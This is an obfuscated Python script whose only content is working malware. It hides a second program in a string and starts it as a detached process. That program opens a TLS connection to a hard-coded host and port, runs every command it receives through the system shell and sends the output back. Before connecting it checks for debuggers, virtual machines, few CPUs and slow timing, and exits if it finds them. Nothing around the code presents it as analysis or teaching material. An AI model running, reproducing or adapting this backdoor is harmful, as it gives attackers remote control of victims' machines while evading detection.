import psutil
import sys

def lddzdzdzh_dzdzdgegegerge_pggeegege():
    efefegegegeg_fziujnif = """
import socket
import ssl
import os
import sys
import random
import time

C3RT_5erV3ur = \"\"\"-----BEGIN CERTIFICATE-----
MIID9zCCAt+gAwIBAgIUYJKJn5bXKPwqp3uv6+S1QiyHFskwDQYJKoZIhvcNAQEL
BQAwgYoxCzAJBgNVBAYTAkFMMREwDwYDVQQIDAhUZXJtYXRlYzEOMAwGA1UEBwwF
WmV1YmkxETAPBgNVBAoMCDNhbmRNb3VrMQ8wDQYDVQQLDAZPa2h0ZWsxDjAMBgNV
BAMMBUdlZGVrMSQwIgYJKoZIhvcNAQkBFhViZWJla2Vsa2VsYkAzYXRheS56ZWIw
HhcNMjUwMTAyMjMxNjUwWhcNMjYwMTAyMjMxNjUwWjCBijELMAkGA1UEBhMCQUwx
ETAPBgNVBAgMCFRlcm1hdGVjMQ4wDAYDVQQHDAVaZXViaTERMA8GA1UECgwIM2Fu
ZE1vdWsxDzANBgNVBAsMBk9raHRlazEOMAwGA1UEAwwFR2VkZWsxJDAiBgkqhkiG
9w0BCQEWFWJlYmVrZWxrZWxiQDNhdGF5LnplYjCCASIwDQYJKoZIhvcNAQEBBQAD
ggEPADCCAQoCggEBAKDjmLuvwfjmXKyV/ETZIvVUeN3d0vTlNy9rDt8wuA2v0YZ/
dfb3iRXvMb1G8SThOQs94gX0MK7bwp8LAsgHmpSGRMkTRLos99/hyczk7+Ejv2zU
EKi3Aki/1FITRELssme1jofcVtJ0VwwUJKC/wA6+u4ZpA/8GIYHKJrZVe6rBbNw+
t3DTKZchmrrNiU5RcMnEozI+4BGBLz7SZCe1tr3mYW1brN0ZkZTMMGJh9aTYRIXd
BdjcGisb1Mt7o1nxljMjFRR1QLkB+lq/x7fswmU+x639Lgghm3FbU7LytcLF7uPP
tJnB7iZPQ2p+NR0WmZmSIERRmlSiub+9IMxMP/0CAwEAAaNTMFEwHQYDVR0OBBYE
FORyi5LJqn/RTem0pCJv/O9IDFW3MB8GA1UdIwQYMBaAFORyi5LJqn/RTem0pCJv
/O9IDFW3MA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAHs7xM3J
fIVbfUrauwpPRtcLKBSa+vAkgFOqb9vehXwvuPTb22zYym6HyAKVGFJi8rMdKJPl
6Ymau2jY5IvI8TIVh6EtDN+f6M8j5D7wxmNRQFy0r3PmwPMzonEIK4LhSvQEfi3b
a+GQuqNYAT4Nv/CDPds4sltxbBgDERAP1d4J39NdrFX46tlSNBS/D3CFEsm4mhZq
Bqs4k/frIs2+BimYaYk8oY3w22+hmdFPFQetLjKhqIQ606dHJA1tDhMw/fSTV0RI
ZVlt7wOUL7GeFuZsQ67ez+7WrwsUBaBuoN3mXUH0L0wfJ9tQtG7mp1ti396UKYuR
k41DKdLRahoz/5E=
-----END CERTIFICATE-----
\"\"\"

R4nd0m_H0stn4m3 = "192.168.1.40"
R4nd0m_P0rt = 8443

def G3nR4nd0mN0m():
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))

def C4nn3x4v3c5eR():
    try:
        with socket.create_connection((R4nd0m_H0stn4m3, R4nd0m_P0rt)) as sock:
            context_5 = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
            context_5.load_verify_locations(cadata=C3RT_5erV3ur)
            context_5.check_hostname = False
            with context_5.wrap_socket(sock, server_hostname=R4nd0m_H0stn4m3) as secure_socket:
                while True:
                    C0mm4nd3 = secure_socket.recv(1024).decode('utf-8')
                    if C0mm4nd3.lower() in ["exit", "quit"]:
                        break
                    R3sultat = os.popen(C0mm4nd3).read()
                    secure_socket.sendall(R3sultat.encode('utf-8'))
    except ssl.SSLEOFError:
        pass
    except Exception as e:
        pass

def V3r1f13Nv1r0nn3m3nt():
    T00ls_D3b00g = ["dbg", "trace", "gdb", "ldd"]
    for tool in T00ls_D3b00g:
        if tool in os.environ.get("PATH", "").lower():
            sys.exit(1)

    M1ch1n3_Virt = ["\\VirtualMachines", "\\Hyper-V"]
    for path in M1ch1n3_Virt:
        if os.path.exists(path):
            sys.exit(1)

    if os.cpu_count() < 2:
        sys.exit(1)

    start = time.time()
    for _ in range(10**6):
        pass
    elapsed = time.time() - start
    if elapsed > 2:
        sys.exit(1)

def main():
    random.seed(time.time())
    V3r1f13Nv1r0nn3m3nt()
    C4nn3x4v3c5eR()

if __name__ == "__main__":
    main()
"""

    process = psutil.Popen(
        [sys.executable, "-c", efefegegegeg_fziujnif],
        stdout=None,
        stderr=None,
        close_fds=True
    )

    return

if __name__ == "__main__":
    lddzdzdzh_dzdzdgegegerge_pggeegege()
    sys.exit(0)

